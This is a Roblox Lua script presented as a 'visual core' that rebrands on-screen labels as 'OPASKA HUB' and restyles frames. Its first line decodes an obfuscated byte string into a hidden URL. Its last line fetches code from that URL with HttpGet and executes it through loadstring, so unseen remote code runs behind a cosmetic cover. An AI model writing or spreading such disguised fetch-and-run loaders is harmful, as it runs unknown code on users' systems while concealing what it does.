
--[[ STAGE 2: VISUAL CORE ]]
local IgS8RPAHyjx29SCX3YeNqB="\161\118\157\166\141\115\120\187\212\127\148\136\224\161\166\165\235\174\180\176\174\160\170\187\173\007\010\000\188\188\187\190\221"local nkx99t1vVeggx7S6LWR4Kd=244 local oDInDHzanB5oudkD=217 local J0WOqkFR5Vtjsre771Ddil=0 local oTx4vNW9pO9K=3 local IwvAKGix0gultMUSxL=5 local gAPUwgG_DlKH=true local ZCl6JHDPEIPUQRD=bit32 and bit32.bxor if not ZCl6JHDPEIPUQRD then ZCl6JHDPEIPUQRD=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local tvLMb0Ti30Y4A={}for _1sEXnSI4W8k9bQ=1,#IgS8RPAHyjx29SCX3YeNqB do local d_X5qdu5MxNGVBnrP4I=string.byte(IgS8RPAHyjx29SCX3YeNqB,_1sEXnSI4W8k9bQ)local tvTlzYVVmCCmzF=(oDInDHzanB5oudkD+(_1sEXnSI4W8k9bQ*oTx4vNW9pO9K)+IwvAKGix0gultMUSxL)%256 if J0WOqkFR5Vtjsre771Ddil==0 then d_X5qdu5MxNGVBnrP4I=(d_X5qdu5MxNGVBnrP4I-tvTlzYVVmCCmzF)%256 tvLMb0Ti30Y4A[_1sEXnSI4W8k9bQ]=string.char(ZCl6JHDPEIPUQRD(d_X5qdu5MxNGVBnrP4I,nkx99t1vVeggx7S6LWR4Kd))else d_X5qdu5MxNGVBnrP4I=ZCl6JHDPEIPUQRD(d_X5qdu5MxNGVBnrP4I,nkx99t1vVeggx7S6LWR4Kd)tvLMb0Ti30Y4A[_1sEXnSI4W8k9bQ]=string.char((d_X5qdu5MxNGVBnrP4I-tvTlzYVVmCCmzF)%256)end end local VpZwh2y7ccXPq=table.concat(tvLMb0Ti30Y4A)if gAPUwgG_DlKH then VpZwh2y7ccXPq=string.reverse(VpZwh2y7ccXPq)end local ed5wyRG9NQwLd=VpZwh2y7ccXPq
local HubName = "OPASKA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(ed5wyRG9NQwLd))()
